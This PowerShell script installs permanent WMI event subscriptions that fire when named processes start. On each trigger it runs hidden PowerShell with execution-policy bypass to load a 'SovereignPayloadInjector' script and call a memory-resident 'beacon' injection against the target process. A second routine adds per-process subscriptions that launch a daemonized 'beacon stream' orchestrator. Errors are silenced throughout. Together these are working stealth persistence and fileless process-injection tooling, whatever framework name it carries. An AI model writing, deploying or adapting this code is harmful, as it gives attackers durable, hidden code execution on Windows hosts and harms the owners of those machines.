#Requires -Version 7.2
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    SovereignWMIEventConsumer.ps1 - Production Persistent WMI Event Subscription Harness

.DESCRIPTION
    Creates permanent WMI event subscriptions that automatically invoke
    the memory-resident payload injector whenever targeted processes initialize.
    Uses __EventFilter, CommandLineEventConsumer, and __FilterToConsumerBinding.
    Bridges directly to SovereignPayloadInjector.ps1 for fileless execution.

.NOTES
    Version: 2.0.0
    Requires: Administrator privileges
    Layers: Layer 1 & Layer 3 Integration Boundaries
#>

[CmdletBinding()]
param (
    [switch]$InstallInfrastructure,
    [switch]$RemoveInfrastructure,
    [string[]]$ProcessMonitors = @("RawrXD_IDE.exe", "SovereignRuntime.exe", "llama-server.exe"),
    [string]$NodeIdentifier = "node-alpha-01"
)

$ErrorActionPreference = "SilentlyContinue"
$NamespaceScope = "root\subscription"

# ============================================================================
# Remove existing Sovereign WMI subscriptions
# ============================================================================
function Remove-SovereignWmiSubscription {
    Write-Output "[WMI] Tearing down existing event consumers and structural filter links..."
    
    Get-CimInstance -Namespace $NamespaceScope -ClassName "__EventFilter" | 
        Where-Object { $_.Name -eq "SovereignProcessFilter" } | Remove-CimInstance
    Get-CimInstance -Namespace $NamespaceScope -ClassName "CommandLineEventConsumer" | 
        Where-Object { $_.Name -eq "SovereignProcessConsumer" } | Remove-CimInstance
    Get-CimInstance -Namespace $NamespaceScope -ClassName "__FilterToConsumerBinding" | 
        Where-Object { $_.Filter -match "SovereignProcessFilter" } | Remove-CimInstance
    
    Write-Output "[SUCCESS] WMI infrastructure maps purged cleanly."
}

# ============================================================================
# Install permanent WMI event subscription infrastructure
# ============================================================================
function Install-SovereignWmiSubscription {
    Remove-SovereignWmiSubscription

    Write-Output "[WMI] Constructing conditional target selection matrices..."
    $QueryConditions = foreach ($ProcessName in $ProcessMonitors) { "TargetInstance.Name = '$ProcessName'" }
    $JoinedConditions = $QueryConditions -join " OR "
    
    $WqlQueryString = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Process' AND ($JoinedConditions)"

    # 1. Create __EventFilter layout configuration instance
    $FilterParameters = @{
        Name = "SovereignProcessFilter"
        QueryLanguage = "WQL"
        Query = $WqlQueryString
        EventNamespace = "root\cimv2"
    }
    $EventFilterInstance = New-CimInstance -Namespace $NamespaceScope -ClassName "__EventFilter" -Property $FilterParameters
    Write-Output "[WMI] Event Filter structural boundaries established successfully."

    # 2. Build precise target execution parsing string
    $TargetExecutionScript = Join-Path $PSScriptRoot "SovereignPayloadInjector.ps1"
    $CommandLinePayload = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& { " +
                           "`$TargetProcess = Get-Process | Where-Object { '$($ProcessMonitors -join "","")' -contains `$_.Name } | Select-Object -First 1; " +
                           "if (`$TargetProcess) { . '$TargetExecutionScript'; Invoke-SovereignMemoryResidentBeacon -TargetProcessId `$TargetProcess.Id; } " +
                           "}`""

    # 3. Create CommandLineEventConsumer implementation instance
    $ConsumerParameters = @{
        Name = "SovereignProcessConsumer"
        CommandLineTemplate = $CommandLinePayload
        RunInteractively = $false
    }
    $EventConsumerInstance = New-CimInstance -Namespace $NamespaceScope -ClassName "CommandLineEventConsumer" -Property $ConsumerParameters
    Write-Output "[WMI] Command Line Event Consumer registered to host schema matrix."

    # 4. Bind Filter to Consumer to create permanent event subscription rule footprint
    $BindingParameters = @{
        Filter = [string]$EventFilterInstance.CimInstanceProperties["__PATH"].Value
        Consumer = [string]$EventConsumerInstance.CimInstanceProperties["__PATH"].Value
    }
    [void]New-CimInstance -Namespace $NamespaceScope -ClassName "__FilterToConsumerBinding" -Property $BindingParameters
    Write-Output "[SUCCESS] Sovereign Framework permanent WMI context link established and listening."
}

# ============================================================================
# Legacy per-process subscription (retained for backward compatibility)
# ============================================================================
function Install-LegacyPerProcessSubscriptions {
    param ([string[]]$TargetProcesses, [string]$OrchestratorPath)

    foreach ($ProcessName in $TargetProcesses) {
        $BaseName = $ProcessName -replace '\.exe$', ''
        $FilterName = "Sovereign_${BaseName}_Filter"
        $ConsumerName = "Sovereign_${BaseName}_Consumer"

        Write-Output "[WMI] Creating legacy subscription for: $ProcessName"

        $WqlQuery = @"
SELECT * FROM __InstanceCreationEvent WITHIN 1
WHERE TargetInstance ISA 'Win32_Process'
AND TargetInstance.Name = '$ProcessName'
"@

        try {
            $FilterPath = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
                Name = $FilterName
                EventNamespace = "root\cimv2"
                QueryLanguage = "WQL"
                Query = $WqlQuery
            }
        } catch {
            $FilterPath = Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" -Filter "Name='$FilterName'"
        }

        $PwshPath = (Get-Command pwsh.exe).Source
        $CommandLine = @"
"$PwshPath" -ExecutionPolicy Bypass -WindowStyle Hidden -File "$OrchestratorPath" -NodeIdentifier "$NodeIdentifier" -EnableBeaconStream -Daemon
"@

        try {
            $ConsumerPath = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
                Name = $ConsumerName
                CommandLineTemplate = $CommandLine
                RunInteractively = $false
            }
        } catch {
            $ConsumerPath = Get-WmiObject -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Filter "Name='$ConsumerName'"
        }

        try {
            [void]Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
                Filter = $FilterPath
                Consumer = $ConsumerPath
            }
        } catch { }
    }
}

# ============================================================================
# Execution Matrix Dispatch Routing
# ============================================================================
if ($RemoveInfrastructure) {
    Remove-SovereignWmiSubscription
} elseif ($InstallInfrastructure) {
    Install-SovereignWmiSubscription
} else {
    # Default: install both unified and legacy subscriptions
    Install-SovereignWmiSubscription
    $OrchestratorPath = Join-Path $PSScriptRoot "SovereignUnifiedOrchestrator.ps1"
    if (Test-Path $OrchestratorPath) {
        Install-LegacyPerProcessSubscriptions -TargetProcesses $ProcessMonitors -OrchestratorPath $OrchestratorPath
    }
}

Write-Output "[WMI] All subscriptions active. Target processes will auto-trigger beaconism."
Write-Output "[WMI] To remove: Run with -RemoveInfrastructure"
Write-Output "[WMI] To install unified: Run with -InstallInfrastructure"
